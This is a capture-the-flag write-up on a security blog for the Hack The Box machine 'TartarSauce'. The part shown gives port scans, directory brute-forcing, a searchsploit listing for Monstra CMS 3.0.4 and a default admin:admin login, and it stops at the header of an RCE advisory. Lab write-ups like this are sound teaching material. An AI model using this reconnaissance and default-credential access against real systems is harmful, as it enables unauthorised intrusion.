<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>TartarSauce | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="TartarSauce" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\/tcp//;s/\/udp//&#39; | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page" /><meta property="og:description" content="Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\/tcp//;s/\/udp//&#39; | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/TartarSauce/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/TartarSauce/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-10T11:20:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png" /><meta property="twitter:title" content="TartarSauce" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"TartarSauce","dateModified":"2021-08-10T11:20:00+05:30","datePublished":"2021-08-10T11:20:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/TartarSauce/"},"image":"https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","description":"Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\\/tcp//;s/\\/udp//&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page","url":"https://0xcaretaker.github.io/posts/TartarSauce/","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /><title>TartarSauce | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="TartarSauce" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\/tcp//;s/\/udp//&#39; | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page" /><meta property="og:description" content="Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\/tcp//;s/\/udp//&#39; | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/TartarSauce/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/TartarSauce/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-10T11:20:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png" /><meta property="twitter:title" content="TartarSauce" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"TartarSauce","dateModified":"2021-08-10T11:20:00+05:30","datePublished":"2021-08-10T11:20:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/TartarSauce/"},"image":"https://0xcaretaker.github.io/assets/img/Posts/TartarSauce/TartarSauce.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","description":"Foothold starts with Wordpress plugin gwolle-gb which is vulnerable to Remote File-Inclusion. You can get user by exploiting sudo privileges on tar, then grabbing MySQL DB password from web-root and dumping database. There’s a cronjob running as root, which creates gzip files using tar. Exploiting the race condition,I can create symlinks on the files inside the zip which will be resolved, once root extracts those zip. This results in file read. Enumeration Masscan + Nmap 1 2 3 $ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.88 Parse those ports to nmap: 1 2 3 4 5 6 7 8 9 10 11 12 $ ports=$(cat masscan.out |awk &#39;{ print $4 }&#39; | sed &#39;s/\\/tcp//;s/\\/udp//&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//&#39;) $ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page","url":"https://0xcaretaker.github.io/posts/TartarSauce/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">TheCaretaker</a></div><div class="site-subtitle font-italic">Penetration Tester | Ethical Hacker | CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/0xCaretaker" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xCaretaker" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['deepakdhasmana0007','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/371479" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/deepak-dhasmana/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>TartarSauce</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TartarSauce</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 10, 2021, 11:20 AM +0530" > Aug 10, 2021 <i class="unloaded">2021-08-10T11:20:00+05:30</i> </span> by <span class="author"> Deepak Dhasmana </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 10, 2021, 11:20 AM +0530" > Aug 10, 2021 <i class="unloaded">2021-08-10T11:20:00+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/TartarSauce/TartarSauce.png" class="post-preview-img"><p>Foothold starts with <strong>Wordpress plugin gwolle-gb</strong> which is vulnerable to <strong>Remote File-Inclusion</strong>. You can get user by exploiting <strong>sudo</strong> privileges on <strong>tar</strong>, then grabbing <strong>MySQL</strong> DB password from web-root and dumping database. There’s a <strong>cronjob</strong> running as root, which creates gzip files using tar. Exploiting the race condition,I can create <strong>symlinks</strong> on the files inside the zip which will be resolved, once root extracts those zip. This results in file read.</p><h1 id="enumeration">Enumeration</h1><h2 id="masscan--nmap">Masscan + Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 80/tcp on 10.10.10.88
</pre></table></code></div></div><p>Parse those ports to nmap:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Landing Page
</pre></table></code></div></div><h2 id="http">HTTP</h2><p>Directory brute-forcing:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://tartarsauce.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-x</span> php,txt,html <span class="nt">-C</span> 401,403,405 <span class="nt">-W</span> 0

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher                    ver: 2.3.1
───────────────────────────┬──────────────────────
     Target Url            │ http://tartarsauce.htb/
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
     Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405]
     Status Code Filters   │ <span class="o">[</span>401, 403, 405]
     Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
     User-Agent            │ feroxbuster/2.3.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Word Count Filter     │ 0
     Extensions            │ <span class="o">[</span>php, txt, html]
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      563l      128w    10766c http://tartarsauce.htb/index.html
200      563l      128w    10766c http://tartarsauce.htb/
200        7l       12w      208c http://tartarsauce.htb/robots.txt
301        9l       28w      324c http://tartarsauce.htb/webservices
301        9l       28w      327c http://tartarsauce.htb/webservices/wp
301        9l       28w      336c http://tartarsauce.htb/webservices/wp/wp-admin
301        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-includes
301        9l       28w      338c http://tartarsauce.htb/webservices/wp/wp-content
200       63l      173w     2338c http://tartarsauce.htb/webservices/wp/wp-login.php
200      196l      563w        0c http://tartarsauce.htb/webservices/wp/
301        9l       28w      343c http://tartarsauce.htb/webservices/wp/wp-admin/images
301        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-admin/includes
200       98l      844w     7413c http://tartarsauce.htb/webservices/wp/readme.html
200        5l       15w      135c http://tartarsauce.htb/webservices/wp/wp-trackback.php
301        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-admin/js
301        9l       28w      340c http://tartarsauce.htb/webservices/wp/wp-admin/css
301        9l       28w      341c http://tartarsauce.htb/webservices/wp/wp-admin/user
200       15l       72w     1168c http://tartarsauce.htb/webservices/wp/wp-admin/install.php
200      385l     3179w    19935c http://tartarsauce.htb/webservices/wp/license.txt
</pre></table></code></div></div><p>If I check out the source code, it has one not-so-useful comment, way below empty lines: <code class="language-plaintext highlighter-rouge">&lt;!--Carry on, nothing to see here :D--&gt;</code> and this is what I get from robots.txt</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">User</span><span class="o">-</span><span class="n">agent</span><span class="p">:</span> <span class="o">*</span>
<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">tar</span><span class="o">/</span><span class="n">tar</span><span class="o">/</span><span class="n">source</span><span class="o">/</span>
<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">monstra</span><span class="o">-</span><span class="mf">3.0</span><span class="p">.</span><span class="mi">4</span><span class="o">/</span>
<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">easy</span><span class="o">-</span><span class="nb">file</span><span class="o">-</span><span class="n">uploader</span><span class="o">/</span>
<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">developmental</span><span class="o">/</span>
<span class="n">Disallow</span><span class="p">:</span> <span class="o">/</span><span class="n">webservices</span><span class="o">/</span><span class="n">phpmyadmin</span><span class="o">/</span>
</pre></table></code></div></div><p>Only <code class="language-plaintext highlighter-rouge">http://tartarsauce.htb/webservices/monstra-3.0.4/</code> is reachable.</p><h2 id="monstra-cms">Monstra CMS</h2><p><code class="language-plaintext highlighter-rouge">http://tartarsauce.htb/webservices/monstra-3.0.4/</code> gives me a CMS, version is just written at the bottom of the page which is <code class="language-plaintext highlighter-rouge">Monstra 3.0.4</code></p><p>Checking for exploits:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit Monstra 3.0.4
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                       |  Path
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Monstra CMS 3.0.4 - <span class="o">(</span>Authenticated<span class="o">)</span> Arbitrary File Upload / Remote C | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                        | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload              | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                   | php/webapps/44502.txt
Monstra CMS &lt; 3.0.4 - Cross-Site Scripting <span class="o">(</span>1<span class="o">)</span>                       | php/webapps/44855.py
Monstra CMS &lt; 3.0.4 - Cross-Site Scripting <span class="o">(</span>2<span class="o">)</span>                       | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery <span class="o">(</span>Account Hijacking<span class="o">)</span>   | php/webapps/45164.txt
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</pre></table></code></div></div><p>I see Arbitrary file upload, Remote code execution but it’s all authenticated. All the users functionality aren’t available except this admin login page at <code class="language-plaintext highlighter-rouge">/webservices/monstra-3.0.4/admin/</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/TartarSauce/tartarsauce-1.png" alt="tartarsauce-1.png" /> And I can just login with <code class="language-plaintext highlighter-rouge">admin:admin</code>.</p><p>Now the authenticated File upload / Remote Code execution says:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="n">Exploit</span> <span class="n">Title</span><span class="o">:</span> <span class="n">Monstra</span> <span class="n">CMS</span> <span class="o">-</span> <span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span> <span class="n">RCE</span>
<span class="n">Vendor</span> <span class="n">Homepage</span><span class="o">:</span> <span class="n">http</span><span class="o">:</span><span class="c1">//monstra.org/</span>
<span class="n">Software</span> <span class="n">Link</span><span class="o">:</span>
<span class="n">https</span><span class="o">:</span><span class="c1">//bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip</span>
<span class="n">Discovered</span> <span class="n">by</span><span class="o">:</span> <span class="n">Ishaq</span> <span class="n">Mohammed</span>
<span class="n">Contact</span><span class="o">:</span> <span class="n">https</span><span class="o">:</span><span class="c1">//twitter.com/security_prince</span>
